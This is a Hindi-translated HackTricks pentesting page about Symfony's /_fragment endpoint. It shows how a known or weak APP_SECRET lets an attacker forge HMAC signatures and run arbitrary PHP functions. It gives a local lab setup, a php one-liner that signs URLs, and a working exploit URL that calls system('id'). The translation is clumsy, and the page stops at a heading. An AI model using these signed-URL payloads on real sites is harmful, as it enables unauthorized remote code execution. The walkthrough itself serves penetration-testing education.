# Symfony

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## рдкрд░рд┐рдЪрдп <a href="#introduction" id="introduction"></a>

рдЬрдм рд╕реЗ 2008 рдореЗрдВ рдЗрд╕рдХреА рд╕реГрдЬрди рд╕реЗ, [Symfony](https://symfony.com) рдлреНрд░реЗрдорд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ рдмрдврд╝рддрд╛ рд╣реА рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдЕрдм рдХрдИ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ CMSs, рдЬреИрд╕реЗ [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (рдкреВрд░реНрд╡ рдореЗрдВ eZPublish), рдпрд╛ [Bolt](https://bolt.cm), рдХреЗ рдореВрд▓ рдШрдЯрдХ рд╣реИ, рдФрд░ рдЕрдХреНрд╕рд░ рдХрд╕реНрдЯрдо рд╡реЗрдмрд╕рд╛рдЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Symfony рдХреА рдПрдХ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╕реБрд╡рд┐рдзрд╛, [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes) рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдИ рдЧрдИ рд╣реИ, рдЬреЛ [`FragmentListener` рд╡рд░реНрдЧ](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php) рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, рдЬрдм рдХреЛрдИ рд╡реНрдпрдХреНрддрд┐ `/_fragment` рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реБрдирдиреЗ рд╡рд╛рд▓рд╛ рд╡реНрдпрдХреНрддрд┐ рджрд┐рдП рдЧрдП GET рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗ рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ **рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ PHP рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (_рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдмрд╛рдж рдореЗрдВ рдЕрдзрд┐рдХ_)ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдПрдХ HMAC рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕ HMAC рдХреА рдЧреБрдкреНрдд рдЬреНрдЮрд╛рдиреА рдЪрд╛рдмреА рдХреЛ Symfony рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рди `secret` рдХреЗ рдирд╛рдо рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рди, `secret`, рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSRF рдЯреЛрдХрди рдФрд░ рдпрд╛рдж-рд░рдЦрдиреЗ-рдореБрдЭреЗ рдЯреЛрдХрди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреА рдорд╣рддреНрд╡рдкреВрд░реНрдгрддрд╛ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП, рдпрд╣ рдорд╛рди рд╕реНрд╡рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ рдмрд╣реБрдд рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ, рд╣рдордиреЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдЕрдХреНрд╕рд░, рдпрд╛ рддреЛ рд╕реАрдорд┐рдд рдорд╛рди рдпрд╛ рдСрдлрд╝рд▓рд╛рдЗрди рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реЛрддреЗ рд╣реИрдВ, рдпрд╛ рдпрд╣ рд╕реАрдорд╛ рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИ, рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдФрд░ рд╕реАрдзреЗ рддреМрд░ рдкрд░ рдЙрд▓реНрд▓рдВрдШрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ Bolt, eZPlatform, рдФрд░ eZPublish рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдРрд╕рд╛ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рдирд┐рд░реНрдорд╛рдг рд╕рдорд╕реНрдпрд╛ рдХреА рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдордиреЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдорд╛рдирдХ, рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдпрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рдорд╛рдиреЗрдВ **рдмрд╣реБрдд, рдмрд╣реБрдд рдЕрдХреНрд╕рд░** рдЙрд▓реНрд▓реЗрдЦрд┐рдд CMSs рдХреЗ рд╕рд╛рде рдФрд░ рдХрд╕реНрдЯрдо рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рдХрд╛ рдореБрдЦреНрдп рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕рдХреА рдорд╣рддреНрд╡рдкреВрд░реНрдгрддрд╛ рдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдпрд╛ рд╕реНрдерд╛рдкрдирд╛ рдЧрд╛рдЗрдб рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдорд╣рддреНрд╡ рдирд╣реАрдВ рджреА рдЬрд╛рддреА рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрдо-рдкреНрд░рднрд╛рд╡реА рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ `secret` рдХреЛ рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХреЗ (рдлрд╝рд╛рдЗрд▓ рд╡рд┐рдлрд▓рддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ), `/_fragment` рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЫреЛрдбрд╝ рджреЗрдВ
### `/_fragment` рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдирд┐рдпрдорд┐рдд рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рдо `/_fragment` рдкреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` рд╣рд░ рдЕрдиреБрд░реЛрдз рдкрд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛: рдпрджрд┐ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрде `/_fragment` рд╣реИ \[1], рддреЛ рдпрд╣ рд╡рд┐рдзрд┐ рдкрд╣рд▓реЗ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдЧреА рдХрд┐ рдЕрдиреБрд░реЛрдз рдорд╛рдиреНрдп рд╣реИ (_рдЕрд░реНрдерд╛рдд рд╕рд╣реА рд░реВрдк рд╕реЗ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ_), рдФрд░ рдЕрдиреНрдпрдерд╛ рдПрдХ рдЕрдкрд╡рд╛рдж рдЙрдард╛рдПрдЧреА \[2]. рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪ рд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░, рдпрд╣ url-encoded `_path` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░реЗрдЧреА, рдФрд░ `$request` рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдЙрд╕рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕реЗрдЯ рдХрд░реЗрдЧреАред

рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ HTTP рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЗ рд╕рд╛рде рдорд┐рд╢реНрд░рд┐рдд рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП: рдпреЗ рдЖрдВрддрд░рд┐рдХ рдорд╛рди рд╣реИрдВ, рдЬреЛ рд╕рд┐рдореНрдлреЛрдиреА рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рд░рдЦреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдФрд░ рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ `_controller` рд╣реИ, рдЬреЛ рд╕реНрдкрд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ рд╕рд┐рдореНрдлреЛрдиреА рдХрдВрдЯреНрд░реЛрд▓рд░ (рдПрдХ _(рдХрдХреНрд╖рд╛, рд╡рд┐рдзрд┐)_ рдЬреЛрдбрд╝, рдпрд╛ рдмрд╕ рдПрдХ _рд╕рдорд╛рд░реЛрд╣_) рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред `_` рд╕реЗ рд╢реБрд░реВ рди рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рд╡реЗ рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рдорд╛рди рд╣реИрдВ, рдЬреЛ рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рд╣рдо рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
рд╣рдо `_path` рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рди рд╕реЗрдЯ рдХрд░реЗрдВрдЧреЗ:

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

рддрдм рдЕрдиреБрд░реЛрдз рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

рдореВрд▓ рд░реВрдк рд╕реЗ, рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рднреА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдпрд╛ рдХрд┐рд╕реА рднреА рдХрдХреНрд╖рд╛ рдХреЗ рдХрд┐рд╕реА рднреА рд╡рд┐рдзрд┐ рдХреЛ рдХрд┐рд╕реА рднреА рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред Symfony рдХреЗ рдкрд╛рд╕ рдЙрдкрд▓рдмреНрдз рдХрдХреНрд╖рд╛рдУрдВ рдХреА рд╡рд┐рд╡рд┐рдзрддрд╛ рдХреЗ рдХрд╛рд░рдг, **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╢реНрдирд╣реАрди рд╣реИ**ред рд╣рдо, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `system()` рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_рд╣рд░ рдмрд╛рд░ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛: рдЙрддреНрдкрд╛рджрди рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрд╛рджрди рдЦрдВрдб рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВред_

рдПрдХ рд╕рдорд╕реНрдпрд╛ рдЕрднреА рднреА рдмрд╛рдХреА рд╣реИ: Symfony рдХреИрд╕реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ?

### URL рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛ <a href="#signing-the-url" id="signing-the-url"></a>

URL рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, _рдкреВрд░реА_ URL рдХреЗ рдЦрд┐рд▓рд╛рдл HMAC рдЧрдгрдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдкреНрд░рд╛рдкреНрдд рд╣реИрд╢ рдлрд┐рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИрд╢ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред

рдХреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЗрд╕реЗ рджреЛ рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, Symfony `_hash` GET рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ, рдлрд┐рд░ рдкреВрд░реА URL рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрдорд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, рдЗрд╕ URL рд╕реЗ `secret` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ HMAC рдХреА рдЧрдгрдирд╛ рдХрд░рддрд╛ рд╣реИ \[1], рдФрд░ рдЗрд╕реЗ рджрд┐рдП рдЧрдП рд╣реИрд╢ рдорд╛рди рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ \[2]. рдпрджрд┐ рд╡реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддреЗ рд╣реИрдВ, рддреЛ `AccessDeniedHttpException` рдЕрдкрд╡рд╛рдж рдЙрдард╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ \[3], рдЬрд┐рд╕рд╕реЗ `403` рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рд╣реИ.

### рдЙрджрд╛рд╣рд░рдг <a href="#example" id="example"></a>

рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдкрд░реАрдХреНрд╖рдг рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВ, рдФрд░ рд╕реАрдХреНрд░реЗрдЯ рдирд┐рдХрд╛рд▓реЗрдВ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
рдЕрдм, `http://localhost:8000/_fragment` рдкрд░ рдЬрд╛рдиреЗ рдкрд░ `403` рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред рдЕрдм рд╣рдо рдПрдХ рдорд╛рдиреНрдп рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВрдЧреЗ:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
`http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D` рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ, рдЕрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ `404` рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд╣реИред рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рд╣реА рдерд╛, рд▓реЗрдХрд┐рди рд╣рдордиреЗ рдХреЛрдИ рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реЗрд╖рддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХреА рдереА, рдЗрд╕рд▓рд┐рдП Symfony рд╣рдорд╛рд░реЗ рдирд┐рдпрдВрддреНрд░рдХ рдХреЛ рдирд╣реАрдВ рдвреВрдВрдв рдкрд╛ рд░рд╣рд╛ рд╣реИред

рд╣рдо рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `system($command, $return_value)` рдХреЛ рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдПрдХ рдкреЗрд▓реЛрдб рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
рдЕрдм рд╣рдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ URL рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

`500` рддреНрд░реБрдЯрд┐ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╣рдорд╛рд░реЗ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛** рд╣реИред

рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЦреЛрдЬрдирд╛ <a href="#finding-secrets" id="finding-secrets"></a>

